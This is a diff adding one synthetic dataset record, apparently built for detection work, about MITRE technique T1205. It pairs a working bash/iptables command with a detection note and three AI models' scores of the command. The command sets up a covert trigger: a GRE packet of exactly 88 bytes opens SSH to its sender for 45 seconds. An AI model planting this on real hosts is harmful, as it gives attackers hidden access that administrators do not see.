@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1205",
+  "platform": "Linux",
+  "shell": "bash",
+  "command": "bash -lc 'ufw --force enable && ufw default deny incoming && ufw logging high && iptables -I ufw-before-input 1 -p gre -m length --length 88:88 -m recent --name GREK --set && iptables -I ufw-before-input 1 -p tcp --dport 22 -m recent --rcheck --seconds 45 --name GREK -j ACCEPT'",
+  "explanation": "Treats a GRE (protocol 47) packet of exact length 88 as a signaling event to allow SSH from that source for 45s. This uses a less common IP protocol and size as the trigger. Detection: Alert on unexpected GRE traffic to hosts not running GRE and correlate with immediate SSH acceptance.",
+  "rationale_steps": [
+    "Enable ufw and deny incoming by default with logging.",
+    "Match GRE protocol packets with exact length 88 and set recent:GREK.",
+    "Allow TCP/22 if the source is in recent:GREK within 45 seconds.",
+    "Detect via IDS/pcap for unexpected GRE to the host and a subsequent SSH allow."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1205-eb871457-b15cc9e4",
+  "source_prompt_hash": "eb871457",
+  "timestamp_utc": "2025-09-30T03:48:01.284804Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command has balanced quotes, valid flags/modules, proper chain insertion, and correct use of && separators.",
+        "semantic_score": 4,
+        "semantic_justification": "It uses a GRE packet of exact length with iptables recent to signal and temporarily allow SSH via UFW chains, aligning with traffic signaling, but it requires root and assumes UFW/iptables availability despite stating 'Privilege: None'.",
+        "combined_score": 4.5,
+        "confidence": 0.88,
+        "timestamp": "2025-10-01T18:52:15.828662Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is well-formed with balanced quoting, proper use of && separators, valid iptables flags including -m length, -m recent, and all arguments are syntactically correct for their respective tools.",
+        "semantic_score": 5,
+        "semantic_justification": "The command correctly implements a port-knocking/traffic signaling mechanism using GRE protocol 47 packets of exact length 88 as a trigger via iptables 'recent' module to temporarily whitelist SSH access for 45 seconds, which is a textbook T1205 implementation using an unconventional protocol as the signal carrier.",
+        "combined_score": 5.0,
+        "confidence": 0.92,
+        "timestamp": "2026-02-19T04:07:46.070835Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is a well-formed bash string with correctly balanced quotes, valid command separators, and proper iptables/ufw flag syntax.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately implements traffic signaling by using a specific GRE packet size as a trigger to dynamically open SSH access via the iptables 'recent' module.",
+        "combined_score": 5.0,
+        "confidence": 1.0,
+        "timestamp": "2026-02-19T04:07:50.984325Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
